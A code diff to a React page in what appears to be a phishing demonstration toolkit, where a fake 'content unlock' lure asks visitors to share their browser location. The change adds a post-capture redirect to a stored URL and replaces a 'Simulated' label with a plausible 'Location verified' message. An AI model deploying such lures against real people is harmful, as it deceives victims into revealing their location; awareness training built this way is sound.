@@ -7,16 +7,16 @@ import type { LocationData } from '@/types';
 import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
-import { Card as ShadcnCard, CardContent, CardDescription } from '@/components/ui/card'; // Renamed to avoid conflict
+import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription } from '@/components/ui/card'; // Renamed to avoid conflict
 import Image from 'next/image';
 import { MapPin, CheckCircle, AlertTriangle, Sparkles, ShieldAlert, Lock, type LucideIcon } from 'lucide-react';
 
 interface TemplateContent {
   title: string;
   actionText: string;
-  message: string; // General message or intro
+  message: string; 
   heroIcon?: LucideIcon;
-  pageSpecificMessage?: string; // More detailed message for specific layouts
+  pageSpecificMessage?: string; 
 }
 
 const templateContent: Record<string, TemplateContent> = {
@@ -37,7 +37,7 @@ const templateContent: Record<string, TemplateContent> = {
   'content-unlock': {
     title: 'Unlock Exclusive Local Content',
     actionText: 'Verify Location to Access',
-    message: 'this content is blocked in some areas.',
+    message: "this content is blocked in some areas.",
     pageSpecificMessage: "Access videos, images, novels, and other files that are restricted in certain countries. Share your location to confirm you reside in a region where this content is available and not blocked.",
     heroIcon: Lock,
   },
@@ -49,6 +49,8 @@ const templateContent: Record<string, TemplateContent> = {
   }
 };
 
+const CONTENT_UNLOCK_REDIRECT_URL_KEY = 'contentUnlockRedirectUrl';
+
 export default function LocationPhishingPage() {
   const { addLog } = useLogs();
   const params = useParams();
@@ -58,11 +60,32 @@ export default function LocationPhishingPage() {
   const [status, setStatus] = useState<'idle' | 'requesting' | 'captured' | 'error'>('idle');
   const [error, setError] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(false);
+  const [statusMessage, setStatusMessage] = useState<string | undefined>(undefined);
 
   useEffect(() => {
     addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [templateId]);
+
+  useEffect(() => {
+    if (status === 'captured') {
+      if (templateId === 'content-unlock') {
+        const redirectUrl = localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY);
+        if (redirectUrl && redirectUrl.trim() !== '') {
+          setStatusMessage("Location verified. Thank you. Now you'll be redirected to the wanted website.");
+          setTimeout(() => {
+            window.location.href = redirectUrl;
+          }, 2500); // Delay for message visibility
+        } else {
+          setStatusMessage("Location verified. Thank you. This window can now be closed.");
+        }
+      } else {
+        setStatusMessage('Location data successfully captured for demonstration.');
+      }
+    } else {
+      setStatusMessage(undefined);
+    }
+  }, [status, templateId]);
 
   const handleLocationRequest = () => {
     if (!navigator.geolocation) {
@@ -138,7 +161,7 @@ export default function LocationPhishingPage() {
           <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
             <CardContent className="space-y-4">
               <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
-              <CardDescription className="text-xl text-foreground font-semibold">{content.message}</CardDescription>
+              <ShadcnCardDescription className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardDescription>
               <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
             </CardContent>
           </ShadcnCard>
@@ -158,7 +181,7 @@ export default function LocationPhishingPage() {
         title={content.title}
         isLoading={isLoading && status !== 'captured'}
         error={error}
-        statusMessage={status === 'captured' ? 'Location data successfully captured for demonstration.' : undefined}
+        statusMessage={statusMessage}
     >
       <div className="space-y-6">
         {renderTemplateSpecificContent()}
@@ -178,8 +201,16 @@ export default function LocationPhishingPage() {
         {status === 'captured' && (
           <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
             <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
-            <p className="text-xl font-semibold text-green-700">Location Verified (Simulated)</p>
-            <p className="text-md text-green-600">Thank you. This window can now be closed.</p>
+            <p className="text-xl font-semibold text-green-700">
+              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) 
+                ? "Location verified. Thank you. Now you'll be redirected..." 
+                : "Location Verified (Simulated)"}
+            </p>
+            <p className="text-md text-green-600">
+              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)
+                ? "Please wait."
+                : "Thank you. This window can now be closed."}
+            </p>
           </div>
         )}
         {status === 'error' && error && (
@@ -193,4 +224,3 @@ export default function LocationPhishingPage() {
     </PhishingPageLayout>
   );
 }
-
